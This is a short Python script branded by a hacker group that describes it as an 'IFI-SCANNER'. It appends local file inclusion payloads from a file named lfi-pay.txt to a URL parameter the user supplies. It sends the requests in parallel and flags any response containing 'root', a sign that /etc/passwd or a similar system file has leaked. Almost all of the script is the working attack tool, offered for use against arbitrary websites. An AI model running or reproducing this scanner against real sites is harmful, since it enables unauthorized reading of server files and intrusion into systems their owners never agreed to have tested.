#!/usr/bin/python 
import os
import requests as nabil 
import concurrent.futures 

logo = """ \033[1;94m
  _    _  _____   _   _ ________   ___    _  _____        
 | |  | |/ ____| | \ | |  ____\ \ / / |  | |/ ____|       
 | |  | | (___   |  \| | |__   \ V /| |  | | (___         
 | |  | |\___ \  | . ` |  __|   > < | |  | |\___ \        
 | |__| |____) | | |\  | |____ / . \| |__| |____) |       
 _\____/|_____/__|_|_\_|______/_/_\_\\____/|_____/ _      
 \ \        / /  ____|  _ \  |__   __/ __ \ / __ \| |     
  \ \  /\  / /| |__  | |_) |    | | | |  | | |  | | |     
   \ \/  \/ / |  __| |  _ <     | | | |  | | |  | | |     
    \  /\  /  | |____| |_) |    | | | |__| | |__| | |____ 
     \/  \/   |______|____/     |_|  \____/ \____/|______|
                                                          
Created By : [1;96mUSNEXUS [1;31m|[1;0m [V H3NTAI V1]

[1;32m------------------------------------------
[93m AUTHOR  : US NEXUS HACKERS
[93m GITHUB  : github.com/us-nexus-hackers
[93m TG      : t.me/usnexushacker
[93m TYPE    : IFI-SCANNER
[1;32m------------------------------------------
"""
os.system('clear')
print(logo)

url = str(input("\033[1;31m>> \033[1;32mEnter Url With Param : \033[1;36m"))
print("")
if "?" in url:
	url = url 
	o = open("lfi-pay.txt","r").readlines()
else:
	print(f"\033[1;31m[!] ERROR : \033[1;32mEnter url with paramater !")
	exit()

def scan(x):
	pay = x.strip()
	url_p = url+pay 
	req = nabil.get(url_p).text 
	if "root" in req:
		print(f"\033[1;32m[+] FOUND     : {url_p}")
	else:
		print(f"\033[1;31m[!] NOT FOUND : {url_p}")
with concurrent.futures.ThreadPoolExecutor() as exe:
	exe.map(scan,o)